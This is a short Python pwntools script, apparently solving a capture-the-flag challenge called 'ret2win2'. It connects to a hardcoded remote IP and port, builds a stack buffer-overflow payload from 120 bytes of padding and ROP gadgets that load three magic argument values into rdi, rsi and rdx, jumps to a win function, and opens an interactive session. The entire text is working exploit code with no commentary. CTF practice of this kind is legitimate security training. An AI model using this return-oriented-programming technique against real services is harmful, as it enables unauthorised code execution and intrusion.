from pwn import *
HOST = '103.185.44.122'
PORT = 19001
p = remote('103.185.44.122', PORT)
# p = process('./ret2win2')
context.log_level = 'DEBUG'
padding = 120

retaddress = 0x000000000040101a
pop_rdi = p64(0x000000000040121e)
pop_rsi = p64(0x0000000000401220)
pop_rdx = p64(0x0000000000401222)

payload = flat([
    b'A' * padding,
    p64(retaddress),
    pop_rdi,
    p64(0xdeadbeefdeadbeef),
    pop_rsi,
    p64(0xabcd1234dcba4321),
    pop_rdx,
    p64(0x147147147147147),
    p64(0x0000000000401227)
])

p.sendlineafter(b': ', payload)
p.interactive()

